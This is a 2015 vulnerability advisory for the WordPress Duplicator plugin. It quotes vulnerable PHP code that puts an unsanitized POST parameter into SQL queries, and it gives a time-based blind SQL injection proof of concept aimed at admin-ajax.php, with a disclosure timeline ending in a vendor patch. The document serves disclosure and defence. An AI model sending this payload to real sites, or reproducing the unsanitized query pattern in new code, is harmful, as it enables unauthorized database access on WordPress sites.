

# Exploit Author : Claudio Viviani

# Vendor Homepage : http://lifeinthegrid.com/labs/duplicator/


# Date : 2015-04-08

# Tested on : Linux / Mozilla Firefox         

######################

# Description

 
 
 Location file: /view/actions.php
 
 This is the bugged ajax functions wp_ajax_duplicator_package_delete:

 function duplicator_package_delete() {

  DUP_Util::CheckPermissions('export');

    try {
  global $wpdb;
  $json    = array();
  $post    = stripslashes_deep($_POST);
  $postIDs  = isset($post['duplicator_delid']) ? $post['duplicator_delid'] : null;
  $list    = explode(",", $postIDs);
  $delCount  = 0;

        if ($postIDs != null) {

            foreach ($list as $id) {
      $getResult = $wpdb->get_results("SELECT name, hash FROM `{$tblName}` WHERE id = {$id}", ARRAY_A);
      if ($getResult) {
        $row    =  $getResult[0];
        $nameHash  = "{$row['name']}_{$row['hash']}";
        $delResult  = $wpdb->query("DELETE FROM `{$tblName}` WHERE id = {$id}");
        if ($delResult != 0) {


 $post['duplicator_delid'] variable is not sanitized

 A authorized user with "export" permission or a remote unauthenticated attacker could
 use this vulnerability to execute arbitrary SQL queries on the victim
 WordPress web site by enticing an authenticated admin (CSRF)


######################

# PoC

 http://target/wp-admin/admin-ajax.php?action=duplicator_package_delete
 
 POST: duplicator_delid=1 and (select * from (select(sleep(20)))a)


######################

# Vulnerability Disclosure Timeline:

2015-04-08:  Discovered vulnerability
2015-04-08:  Vendor Notification
2015-04-09:  Vendor Response/Feedback 
2015-04-10:  Vendor Send Fix/Patch
2015-04-10:  Public Disclosure

